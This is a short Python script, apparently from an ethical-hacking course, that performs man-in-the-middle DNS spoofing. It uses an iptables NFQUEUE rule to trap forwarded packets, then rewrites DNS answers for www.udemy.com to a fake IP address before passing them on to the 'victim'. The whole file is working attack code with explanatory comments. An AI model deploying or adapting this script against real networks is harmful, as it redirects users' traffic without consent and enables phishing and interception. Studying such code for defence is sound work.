import netfilterqueue
import scapy.all as scapy

# 1. iptables -I FORWARD -j NFQUEUE --queue-num 0. This command in terminal creates the NF queue. The queue is accessed in this program
# 2. The program is then run to trap packets in the queue.
# 3. Forward the DNS packet to the actual DNS server. Wait for the response and then modify the packet


def process_packet(packet):

    # convert the netfilterqueue packet into a scapy packet, in order to access the layers with scapy.
    scapy_packet = scapy.IP(packet.get_payload())

    # looks for DNS responses (resource record) to victim. DNSQR is DNS queries sent from victim
    if scapy_packet.haslayer(scapy.DNSRR):

        qname = scapy_packet[scapy.DNSQR].qname #website that the victim wants to visit

        if 'www.udemy.com' in qname: # hacker wants to spoof DNS request when victim goes to www.udemy.com
            print("[+] Spoofing target. " + qname)

            # craft a fake DNS response. rrname is the website name, rdata is the fake IP of www.udemy.com.
            # The rest of the fields are automatically filled by scapy
            answer = scapy.DNSRR(rrname=qname, rdata="172.217.26.68")

            # replace actual DNS answer with fake one 
            scapy_packet[scapy.DNS].an = answer

            # reset number of DNS answers in the packet to 1. Initially there were others but we are only creating 1
            scapy_packet[scapy.DNS].ancount = 1

            # delete len and chksum fields from the IP and UDP layer as these will be wrong.
            # Scapy will automatically recalculate the values based on the fields that were modified.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet)) # convert the scapy packet back to the original packet

    packet.accept() 

queue = netfilterqueue.NetfilterQueue() # create a NF queue object

# binds queue to the queue created in the terminal (with queue-num = 0) with the above command.
# process_packet is the call back function to execute each time a packet comes in
queue.bind(0, process_packet)
queue.run()

